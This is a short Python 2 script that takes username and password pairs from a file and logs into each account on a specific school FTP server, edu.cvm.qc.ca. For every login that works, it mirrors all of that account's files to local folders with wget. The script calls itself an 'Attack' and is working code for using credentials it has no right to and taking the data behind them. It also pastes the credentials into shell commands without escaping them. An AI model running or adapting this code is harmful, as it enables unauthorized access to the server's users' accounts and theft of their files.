import ftplib
import socket
import os
import time

#####################################################
#                                                   #
#   Requires "wget" to be installed on your system  #
#   https://www.gnu.org/software/wget/              #
#                                                   #
#####################################################

def main():

    server = "edu.cvm.qc.ca"
    
    f = open("working_login.txt","r")
    g = f.read()
    f.close()

    g = g.split("\n\n")

    socket.setdefaulttimeout(2)

    ans = "unknown"

    try:
        s = socket.socket()
        s.connect((server,21))

        try:
            ans = s.recv(1024)
            s.close()
        except:
            s.close()
            pass
    except:
        print "No service on port 21. Attack Stopped"
        s.close()
        return 0
    for i in g:
        user = i[0:7]
        password = i[9:15]
        
        try:
            ftp = ftplib.FTP(server)
            print "Connecting with user "+user+" and password "+password

            ftp.login(user,password)

            os.system("mkdir Downloads/"+user)
            os.system("wget -r -P Downloads/"+user+" --ftp-user="+user+" --ftp-password="+password+" ftp://edu.cvm.qc.ca")
            
    
        except:
            print "Cannot connect to account "+user+". Trying next user"

if __name__ == "__main__":
    main()
